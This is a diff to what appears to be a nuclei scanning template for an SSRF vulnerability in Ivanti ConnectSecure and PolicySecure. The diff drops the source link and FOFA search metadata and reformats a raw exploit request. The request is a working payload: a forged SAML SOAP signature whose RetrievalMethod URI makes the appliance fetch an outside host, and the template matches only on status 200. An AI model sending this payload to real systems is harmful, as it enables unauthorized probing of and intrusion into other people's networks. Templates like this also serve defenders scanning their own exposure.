@@ -3,15 +3,11 @@ info:
   name: Ivanti ConnectSecure和 Ivanti PolicySecure SSRF漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dkgv7mes7um6234a'
+  description: ''
   tags: ssrf,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dkgv7mes7um6234a
-    fofa: body="welcome.cgi?p=logo"
 http:
 - raw:
-  - "GET /dana-ws/saml20.ws HTTP/1.1\n\nAccept-Encoding: gzip, deflate\n\nAccept: */*\n\nConnection: close\n\nContent-Type: text/xml\n\n\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n\n    <soap:Body>\n\n        <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n\n            <ds:SignedInfo>\n\n                <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n\n                <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n\n            </ds:SignedInfo>\n\n            <ds:SignatureValue>qwerty</ds:SignatureValue>\n\n            <ds:KeyInfo xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.w3.org/2000/09/xmldsig#\" xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n\n                <ds:RetrievalMethod URI=\"www.baidu.com\"/>\n\n                <ds:X509Data/>\n\n            </ds:KeyInfo>\n\n            <ds:Object></ds:Object>\n\n        </ds:Signature>\n\n    </soap:Body>\n\n</soap:Envelope>\n\n# 响应代码特征\n200\n\n# 响应内容特征\n暂无\n\n# 上传文件定位\n暂无"
+  - "GET /dana-ws/saml20.ws HTTP/1.1\n\nAccept-Encoding: gzip, deflate\n\nAccept: */*\n\nConnection: close\n\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n\n    <soap:Body>\n\n        <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n\n            <ds:SignedInfo>\n\n                <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n\n                <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n\n            </ds:SignedInfo>\n\n            <ds:SignatureValue>qwerty</ds:SignatureValue>\n\n            <ds:KeyInfo xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.w3.org/2000/09/xmldsig#\" xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n\n                <ds:RetrievalMethod URI=\"www.baidu.com\"/>\n\n                <ds:X509Data/>\n\n            </ds:KeyInfo>\n\n            <ds:Object></ds:Object>\n\n        </ds:Signature>\n\n    </soap:Body>\n\n</soap:Envelope>\n\n# 响应代码特征\n200\n\n# 响应内容特征\n暂无\n\n# 上传文件定位\n暂无"
   redirects: false
   matchers:
   - status:
